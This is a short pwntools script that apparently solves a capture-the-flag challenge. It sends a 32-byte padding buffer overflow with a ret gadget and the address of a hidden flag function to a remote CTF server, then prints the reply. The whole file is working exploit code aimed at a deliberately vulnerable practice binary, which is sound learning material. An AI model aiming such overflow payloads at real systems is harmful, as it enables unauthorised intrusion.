#!/usr/bin/env python3
from pwn import *

elf = ELF('./chal_')
rop = ROP(elf)

# p = elf.process()
p = remote('pwn2.ihack.sibersiaga.my', 1389)

def exploit():

    padding = b'A'*32
    ret = (rop.find_gadget(['ret']))[0]
    flag = elf.symbols['ZmxhZ2hlcmUh']

    payload = padding
    payload += p32(ret)
    payload += p32(flag)

    print(p.recvuntil(b':\n'))

    print(payload)
    p.sendline(payload)

    print(p.recvall())

def main():
	exploit()

if __name__ == "__main__":
	main()